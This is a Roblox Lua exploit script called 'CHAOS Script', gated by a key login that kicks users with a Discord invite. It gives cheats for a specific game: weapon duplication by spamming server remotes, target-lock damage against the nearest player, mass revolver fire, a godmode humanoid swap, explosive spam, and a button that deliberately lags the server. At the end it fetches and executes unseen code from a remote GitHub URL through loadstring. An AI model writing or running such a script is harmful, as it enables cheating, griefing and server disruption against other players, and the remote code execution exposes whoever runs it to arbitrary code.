-- // Logins: // --

local Usernames = {
["IShowSpeed"] = true;
}

local Passwords = {
["IShowSpeed"] = true;
}


-- // Variables: // --

local Login = game.CoreGui.Login

local Key = Login.Main.WhitelistFrame.Key

local Username = Login.Main.UserFrame.UserBox

local Userpassed = false

local WLPassed = false



-- // Login Function: // --

if Usernames[Username.Text] then
Userpassed = true
else
game.Players.LocalPlayer:Kick("Wrong Key! [Join My Discord For Key] https://discord.gg/uvgaJgCzjx ")
end

if Passwords[Key.Text] then
WLPassed = true
else
game.Players.LocalPlayer:Kick("Wrong Key! [Join My Discord For Key] https://discord.gg/uvgaJgCzjx")
end

if Userpassed == true then
if WLPassed == true then
for i,v in pairs(game.CoreGui:GetDescendants()) do
 if v.Name == "Main" then
  v:Destroy()
 end
end


local Ctrl_click_tp = false
local plrs = game:GetService'Players'
local plr = plrs.LocalPlayer
local mouse = plr:GetMouse()
local rep = game:GetService'ReplicatedStorage'
local uis = game:GetService'UserInputService'
local ts = game:GetService'TweenService'
local rs = game:GetService'RunService'
local dupping = false
local walkSpeed = 16
local tar

spawn(function()
    while true do rs.RenderStepped:wait()
        pcall(function()
            if not uis:IsKeyDown(Enum.KeyCode.LeftShift) then
                plr.Character.Humanoid.WalkSpeed = walkSpeed
            elseif uis:IsKeyDown(Enum.KeyCode.LeftShift) then
                plr.Character.Humanoid.WalkSpeed = walkSpeed+4
            end
        end)
    end
end)

local function Notify(title,text,duration)
    game:GetService'StarterGui':SetCore('SendNotification',{
    	Title = tostring(title),
    	Text = tostring(text),
    	Duration = tonumber(duration),
    })
end
local function AddCd(tool,Cd)
    local cd = Instance.new('IntValue',tool)
    cd.Name = 'ClientCD'
    game.Debris:AddItem(cd,Cd)
end
local function Shoot(firstPos,nextPos,Revolver)
    if Revolver:FindFirstChild'Barrel' and Revolver.Barrel:FindFirstChild'Attachment' then
    	if Revolver.Barrel.Attachment:FindFirstChild'Sound' then
    		local SoundClone = Revolver.Barrel.Attachment.Sound:Clone()
    		SoundClone.Name = 'Uncopy'
    		SoundClone.Parent = Revolver.Barrel.Attachment
    		SoundClone:Play()
    		game.Debris:AddItem(SoundClone, 1)
    	end
    	local FilterTable = {}
    	table.insert(FilterTable, plr.Character)
    	table.insert(FilterTable, game.Workspace['Target Filter'])
    	for _, v in pairs(game.Workspace:GetDescendants()) do
    		if v.ClassName == 'Accessory' then
    			table.insert(FilterTable, v)
    		end
    	end
    	local a_1, a_2, a_3 = game.Workspace:FindPartOnRayWithIgnoreList(Ray.new(firstPos, (nextPos - firstPos).Unit * 100), FilterTable)
    	local BulletCl = rep['Revolver Bullet']:Clone()
    	game.Debris:AddItem(BulletCl, 1)
    	BulletCl.Parent = game.Workspace['Target Filter']
    	local mg = (firstPos - a_2).Magnitude
    	BulletCl.Size = Vector3.new(0.2, 0.2, mg)
    	BulletCl.CFrame = CFrame.new(firstPos, nextPos) * CFrame.new(0, 0, -mg / 2)
    	ts:Create(BulletCl, TweenInfo.new(0.3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
    		Size = Vector3.new(0.05, 0.05, mg), 
    		Transparency = 1
    	}):Play()
    	if a_1 then
    		local expPart = Instance.new'Part'
    		game.Debris:AddItem(expPart, 2)
    		expPart.Name = 'Exploding Neon Part'
    		expPart.Anchored = true
    		expPart.CanCollide = false
    		expPart.Shape = 'Ball'
    		expPart.Material = Enum.Material.Neon
    		expPart.BrickColor = BulletCl.BrickColor
    		expPart.Size = Vector3.new(0.1, 0.1, 0.1)
    		expPart.Parent = game.Workspace['Target Filter']
    		expPart.Position = a_2
    		ts:Create(expPart, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {
    			Size = Vector3.new(2, 2, 2), 
    			Transparency = 1
    		}):Play()
    		if Revolver:FindFirstChild'DamageRemote' and a_1.Parent:FindFirstChild'Humanoid' then
    			Revolver.DamageRemote:FireServer(a_1.Parent.Humanoid)
    		end
    	end
    end
end

--local library = loadstring(game:HttpGet('https://pastebin.com/raw/iRY40ktw'))()

local wd = library.CreateWindow({Name = "CHAOS Script"})
local pg1 = wd.CreatePage({Name = "Main Scripts"})
local pg2 = wd.CreatePage({Name = "Spam"})
local pg3 = wd.CreatePage({Name = "Credits"})

pg1.CreateButton({
    Name = "dupe",
    Callback = function()
        if not dupping then
            Notify('Dupping','Time left: 5 sec',5)
            spawn(function()
                dupping = true
                local c = 1
                for i = 1,50 do
                    pcall(function()
                        if c>#rep.Weapons:GetChildren() then
                            c = 1
                        end
                    end)
                    for _,v in next,plr.Character:GetChildren() do
                        if v.Name == 'Loaded' and v:IsA'IntValue' then
                            v:Destroy()
                        end
                    end
                    for _,v in next,plr.PlayerGui:GetDescendants() do
                        if v:IsA'RemoteEvent' and v.Name == 'RemoteEvent' then
                            pcall(function()
                                v:FireServer(rep.Weapons:GetChildren()[c].Name)
                                c=c+1
                            end)
                        end
                    end
                    wait(0.1)
                end
                Notify('Dupe','Done!',5)
                dupping = false
            end)
        else Notify('Dupping','Already dupping',3)
        end
    end})
    
pg1.CreateToggle({
    Name = "хз",
    Callback = function(bool)
        Ctrl_click_tp = bool
    end})

pg1.CreateBox({
    Name = "Speed",
    Mode = "number",
    Callback = function(value)
        walkSpeed = value
    end})
    
pg1.CreateButton({
    Name = "minigun",
    Callback = function()
        tar = nil
        for _,v in next,workspace:GetDescendants() do
            if v.Name == 'SelectedPlayer' then
                v:Destroy()
            end
        end
        local n_plr, dist
        for _, v in pairs(plrs:GetPlayers()) do
            if v ~= plr and plr.Character and plr.Character:FindFirstChild'HumanoidRootPart' then
                local distance = v:DistanceFromCharacter(plr.Character.HumanoidRootPart.Position)
                if v.Character and (not dist or distance <= dist) and v.Character:FindFirstChildOfClass'Humanoid' and v.Character:FindFirstChildOfClass'Humanoid'.Health>0 and v.Character:FindFirstChild'HumanoidRootPart' then
                    dist = distance
                    n_plr = v
                end
            end
        end
        local sp = Instance.new('SelectionBox',n_plr.Character.HumanoidRootPart)
        sp.Name = 'SelectedPlayer'
        sp.Adornee = n_plr.Character.HumanoidRootPart
        tar = n_plr
    end})
    
pg3.CreateButton({
    Name = "Made by Luaht_Official",
    Callback = function()
        Notify('Credits','Script made by Luaht_Official',3)
    end})
    
pg1.CreateButton({
    Name = "Hean lock",
    Callback = function()
        for _,v in next,plr.Character:GetDescendants() do
            if v:IsA'Tool' and v.Name ~= 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'DamageRemote' and v:FindFirstChild'Cooldown' and tar and tar.Character and tar.Character:FindFirstChildOfClass'Humanoid' then
                AddCd(v,v.Cooldown.Value)
                v.DamageRemote:FireServer(tar.Character:FindFirstChildOfClass'Humanoid')
                if v:FindFirstChild'Attack' and plr.Character:FindFirstChildOfClass'Humanoid' then
                    plr.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(v.Attack):Play()
                end
                if v:FindFirstChild'Blade' then
                    for _,x in next,v.Blade:GetChildren() do
                        if x:IsA'Sound' then
                            x:Play()
                        end
                    end
                end
            elseif v:IsA'Tool' and v.Name == 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'ReplicateRemote' and v:FindFirstChild'Barrel' and v.Barrel:FindFirstChild'Attachment' and tar and tar.Character and tar.Character:FindFirstChild'HumanoidRootPart' then
                v.Parent = plr.Character
                AddCd(v,2)
                rs.Stepped:wait()
                Shoot(v.Barrel.Attachment.WorldPosition,tar.Character.HumanoidRootPart.Position,v)
                v.ReplicateRemote:FireServer(tar.Character.HumanoidRootPart.Position)
            end
        end
    end})

pg1.CreateButton({
    Name = "Sniper",
    Callback = function()
        wait(0.5)
        local guns = 0
        for _,v in next,plr.Backpack:GetChildren() do
            if guns<= 10 and plr.Character and plr.Character:FindFirstChild'Head' and v.Name == 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'ReplicateRemote' and v:FindFirstChild'Barrel' and v.Barrel:FindFirstChild'Attachment' then
                guns = guns+1
                AddCd(v,2)
                v.Parent = plr.Character
                Shoot(plr.Character.Head.Position,mouse.Hit.p,v)
                v.ReplicateRemote:FireServer(mouse.Hit.p)
                v.Parent = plr.Backpack
            end
        end
    end})
    
pg1.CreateButton({
    Name = "Minigun",
    Callback = function()
        wait(0.5)
        for _,v in next,plr.Backpack:GetChildren() do
            if plr.Character and plr.Character:FindFirstChild'Head' and v.Name == 'Kawaii Revolver' and v:FindFirstChild'ReplicateRemote' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'Barrel' and v.Barrel:FindFirstChild'Attachment' then
                AddCd(v,2)
                v.Parent = plr.Character
                Shoot(v.Barrel.Attachment.WorldPosition,mouse.Hit.p,v)
                v.ReplicateRemote:FireServer(mouse.Hit.p)
                rs.Stepped:wait()
                v.Parent = plr.Backpack
            end
        end
    end})
    
pg1.CreateButton({
    Name = "god",
    Callback = function()
        Notify('Godmode','Loading... wait 5 sec.',5)
        for _,v in next,plr.PlayerGui:GetChildren() do
            if v:IsA'ScreenGui' and v.Name ~= 'Chat' and v.Name ~= 'BubbleChat' then
                v.ResetOnSpawn = false
                spawn(function()
                    wait(5)
                    plr.CharacterAdded:wait()
                    if v then
                        v:Destroy()
                    end
                end)
            elseif v:IsA'LocalScript' then
                v.Parent = plr
                spawn(function()
                    wait(5)
                    v.Parent = plr.PlayerGui
                end)
            end
        end
        if plr.Character and plr.Character:FindFirstChildOfClass'Humanoid' then
            if plr.Character:FindFirstChild'Ragdolled' and plr.Character.Ragdolled:FindFirstChildOfClass'Script' then
                plr.Character.Ragdolled:FindFirstChildOfClass'Script':Destroy()
            end
            local char = plr.Character
            char.Archivable = true
            local new = char:Clone()
            new.Parent = workspace
            plr.Character = new
            wait(2)
            local oldhum = char:FindFirstChildOfClass'Humanoid'
            local newhum = oldhum:Clone()
            newhum.Parent = char
            newhum.RequiresNeck = false
            oldhum.Parent = nil
            wait(2)
            plr.Character = char
            new:Destroy()
            wait(1)
            newhum:GetPropertyChangedSignal('Health'):Connect(
                function()
                    if newhum.Health <= 0 then
                        oldhum.Parent = plr.Character
                        wait(1)
                        oldhum:Destroy()
                    end
                end)
            workspace.CurrentCamera.CameraSubject = char
        end
        Notify('Godmode','Godmode loaded',3)
    end})
    
pg2.CreateButton({
    Name = "grenade spam",
    Callback = function()
        for _,v in next,plr.Backpack:GetChildren() do
            if v.Name == 'Grenade' and v:FindFirstChild'RemoteEvent' then
                v.Parent = plr.Character
                v.RemoteEvent:FireServer(mouse.Hit.LookVector)
                wait()
                v.Parent = plr.Backpack
            end
        end
    end})
    
pg2.CreateButton({
    Name = "c4 boom",
    Callback = function()
        for _,v in next,plr.Backpack:GetChildren() do
            if v.Name == 'C4' and v:FindFirstChild'RemoteEvent' then
                v.Parent = plr.Character
                v.RemoteEvent:FireServer()
                wait()
                v.Parent = plr.Backpack
            end
        end
    end})
    
pg2.CreateButton({
    Name = "skipe",
    Callback = function()
        for _,v in next,plr.Backpack:GetChildren() do
            if v.Name == 'Spiked Trap' then
                v.Parent = plr.Character
                v:Activate()
                wait()
                v.Parent = plr.Backpack
            end
        end
    end})
    
pg2.CreateButton({
    Name = "Lag(dont click)",
    Callback = function()
        wait(2)
        local c = 0
        for _,v in next,plr.Backpack:GetChildren() do
            if plr.Character and plr.Character:FindFirstChild'Head' and v.Name == 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'ReplicateRemote' and v:FindFirstChild'Barrel' and v.Barrel:FindFirstChild'Attachment' then
                c = c+1
                if c>50 then
                    c = 0
                    rs.RenderStepped:wait()
                end
                AddCd(v,2)
                v.Parent = plr.Character
                v.ReplicateRemote:FireServer(mouse.Hit.p)
                v.Parent = plr.Backpack
            end
        end
    end})

spawn(function()
    mouse.Button1Down:connect(function()
        if not uis:IsKeyDown(Enum.KeyCode.LeftControl) then
            return 
        end
        if not mouse.Hit then
            return 
        end 
        if Ctrl_click_tp and plr.Character and plr.Character:FindFirstChild'HumanoidRootPart' then
            plr.Character:FindFirstChild'HumanoidRootPart'.CFrame = mouse.Hit + Vector3.new(0,5,0)
        end
    end)
end)

plr:GetMouse().KeyDown:Connect(function(key)
    if key == 'r' then
        tar = nil
        for _,v in next,workspace:GetDescendants() do
            if v.Name == 'SelectedPlayer' then
                v:Destroy()
            end
        end
        local n_plr, dist
        for _, v in pairs(game.Players:GetPlayers()) do
            if v ~= plr and plr.Character and plr.Character:FindFirstChild'HumanoidRootPart' then
                local distance = v:DistanceFromCharacter(plr.Character.HumanoidRootPart.Position)
                if v.Character and (not dist or distance <= dist) and v.Character:FindFirstChildOfClass'Humanoid' and v.Character:FindFirstChildOfClass'Humanoid'.Health>0 and v.Character:FindFirstChild'HumanoidRootPart' then
                    dist = distance
                    n_plr = v
                end
            end
        end
        local sp = Instance.new('SelectionBox',n_plr.Character.HumanoidRootPart)
        sp.Name = 'SelectedPlayer'
        sp.Adornee = n_plr.Character.HumanoidRootPart
        tar = n_plr
    elseif key == 'q' and tar and plr.Character then
        for _,v in next,plr.Character:GetDescendants() do
            if v:IsA'Tool' and v.Name ~= 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'DamageRemote' and v:FindFirstChild'Cooldown' and tar and tar.Character and tar.Character:FindFirstChildOfClass'Humanoid' then
                AddCd(v,v.Cooldown.Value)
                v.DamageRemote:FireServer(tar.Character:FindFirstChildOfClass'Humanoid')
                if v:FindFirstChild'Attack' and plr.Character:FindFirstChildOfClass'Humanoid' then
                    plr.Character:FindFirstChildOfClass'Humanoid':LoadAnimation(v.Attack):Play()
                end
                if v:FindFirstChild'Blade' then
                    for _,x in next,v.Blade:GetChildren() do
                        if x:IsA'Sound' then
                            x:Play()
                        end
                    end
                end
            elseif v:IsA'Tool' and v.Name == 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'ReplicateRemote' and v:FindFirstChild'Barrel' and v.Barrel:FindFirstChild'Attachment' and tar and tar.Character and tar.Character:FindFirstChild'HumanoidRootPart' then
                v.Parent = plr.Character
                AddCd(v,2)
                rs.Stepped:wait()
                Shoot(v.Barrel.Attachment.WorldPosition,tar.Character.HumanoidRootPart.Position,v)
                v.ReplicateRemote:FireServer(tar.Character.HumanoidRootPart.Position)
            end
        end
    elseif key == 'c' and plr:FindFirstChild'Backpack' then
        local guns = 0
        for _,v in next,plr.Backpack:GetChildren() do
            if guns<= 10 and plr.Character and plr.Character:FindFirstChild'Head' and v.Name == 'Kawaii Revolver' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'ReplicateRemote' and v:FindFirstChild'Barrel' and v.Barrel:FindFirstChild'Attachment' then
                guns = guns+1
                AddCd(v,2)
                v.Parent = plr.Character
                Shoot(plr.Character.Head.Position,mouse.Hit.p,v)
                v.ReplicateRemote:FireServer(mouse.Hit.p)
                v.Parent = plr.Backpack
            end
        end
    elseif key == 'v' then
        for _,v in next,plr.Backpack:GetChildren() do
            if plr.Character and plr.Character:FindFirstChild'Head' and v.Name == 'Kawaii Revolver' and v:FindFirstChild'ReplicateRemote' and not v:FindFirstChild'ClientCD' and v:FindFirstChild'Barrel' and v.Barrel:FindFirstChild'Attachment' then
                AddCd(v,2)
                v.Parent = plr.Character
                Shoot(v.Barrel.Attachment.WorldPosition,mouse.Hit.p,v)
                v.ReplicateRemote:FireServer(mouse.Hit.p)
                rs.Stepped:wait()
                v.Parent = plr.Backpack
            end
        end
    elseif key == 'l' and plr.Character then
        if not dupping then
            Notify('Dupping','Time left: 5 sec',5)
            spawn(function()
                dupping = true
                local c = 1
                for i = 1,50 do
                    pcall(function()
                        if c>#rep.Weapons:GetChildren() then
                            c = 1
                        end
                    end)
                    for _,v in next,plr.Character:GetChildren() do
                        if v.Name == 'Loaded' and v:IsA'IntValue' then
                            v:Destroy()
                        end
                    end
                    for _,v in next,plr.PlayerGui:GetDescendants() do
                        if v:IsA'RemoteEvent' and v.Name == 'RemoteEvent' then
                            pcall(function()
                                v:FireServer(rep.Weapons:GetChildren()[c].Name)
                                c=c+1
                            end)
                        end
                    end
                    wait(0.1)
                end
                Notify('Dupe','Done!',5)
                dupping = false
            end)
        else Notify('Dupping','Already dupping',3)
        end
    end
end)
loadstring(game:HttpGet(('https://raw.githubusercontent.com/OofHead-FE/nexo-before-deleted/main/NexoPD'),true))()
local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://7545764969"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "HACKER_YT";
	Text = "SCRIPT HAS BEEN ON";
	Duration = 16;
})
end
end
